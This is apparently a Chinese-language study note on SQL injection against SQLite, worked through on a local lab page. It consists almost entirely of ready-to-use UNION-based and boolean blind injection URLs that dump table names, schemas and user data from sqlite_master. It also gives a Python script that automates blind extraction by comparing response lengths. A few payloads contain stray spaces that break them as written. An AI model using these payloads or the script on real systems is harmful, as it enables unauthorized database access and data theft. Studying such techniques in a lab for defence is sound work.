# sqlite注入
[TOC]
## union注入
1. 获取字段长度

```
http://127.0.0.1/sqlite-lab/index.php?snumber=1 union select 1,2,3,4,5-- -
```

2. 获取表名
```
http://127.0.0.1/sqlite-lab/index.php?snumber=1337 union SELECT 1,group_concat(tbl_name),3,4,5 FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 1-- - 
```
> select * from table limit 2 offset 1;      
//含义是从第1条（不包括）数据开始取出2条数据，limit后面跟的是2条数据，offset后面是从第1条开始读取，即读取第2,3条。通过修改offset 1获取不同表数据

3. 获取列名
```
http://127.0.0.1/sqlite-lab/index.php?snumber=1337 union SELECT 1,sql,3,4,5 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='users'-- -
```
>能把表结构直接爆出来，通过下面语句清除表类型
```
http://127.0.0.1/sqlite-lab/index.php?snumber=1337 union select 1,replace(replace(replace(replace(replace(replace(replace(replace(replace(r eplace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')% 2b1)),'`')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARYKEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~'),3,4,5 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' and name='users'  
```
4. 获取数据
```
http://127.0.0.1/sqlite-lab/index.php?snumber=1337 union SELECT 1,OS,3,4,5 FROM users
```
## 布尔值注入
1. 统计表个数
```
http://127.0.0.1/sqlite-lab/index.php?tag=111' or (SELECT count(tbl_name) FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%'  ) = 5 -- - 
```
2. 获取第一个表名长度
```
http://127.0.0.1/sqlite-lab/index.php?tag=111' or (SELECT length(tbl_name) FROM sqlite_master  WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0) = 5-- -
```
3. 获取第一个表名第一个字符
```
http://127.0.0.1/sqlite-lab/index.php?tag=1111111' or(SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('a')-- -
```
4. 获取列名
```
http://www.123.com/sqlite-lab/?tag=11111' or (SELECT substr(hex(sql),1,1) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='info')='4' -- -&search=1 
```
>435245415445205441424C452022696E666F2220280A09606E756D6265726009494E5445474552205052494D415259204B4559204155544F494E4352454D454E5420554E495155452C0A09604F536009544558542C0A09605365727665725F49506009544558542C0A0960507269636560094E554D455249432C0A09605461676009544558540A29 转换一下
CREATE TABLE "info" (
	`number`	INTEGER PRIMARY KEY AUTOINCREMENT UNIQUE,
	`OS`	TEXT,
	`Server_IP`	TEXT,
	`Price`	NUMERIC,
	`Tag`	TEXT
)

脚本如下：

```
import requests
import string
url="http://www.123.com/sqlite-lab/"
guess = string.digits+string.ascii_uppercase
print(guess)
right_data={'tag':"11111' or (SELECT substr(hex(sql),1,1) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='info')='4' -- -",'search':'1' }
wrong_data={'tag':"11111' or (SELECT substr(hex(sql),1,1) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='info')='3' -- -",'search':'1' }
right_response_len = len(requests.post(url,right_data).content)
wrong_response_len = len(requests.post(url,wrong_data).content)

flag = ""
key=0
print("Start")
for i in range(1,1000):
    if key == 1:
        break
    for payload in guess:
        tag = "11111' or (SELECT substr(hex(sql),%s,1) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%%' AND name ='info')='%s' -- -" %(i,payload)
        data={'tag':tag,'search':'1'}
        cur_res = requests.post(url,data)
        cur_res_len = len(cur_res.text)
        # print cur_res_len
        if cur_res_len == right_response_len:    #比较返回包的大小
            flag += payload
            print("pwd is:%s"%flag)
            break
        else:
            if payload == 'Z':
                key = 1
                break
print('[Finally] current table is %s'% flag)
```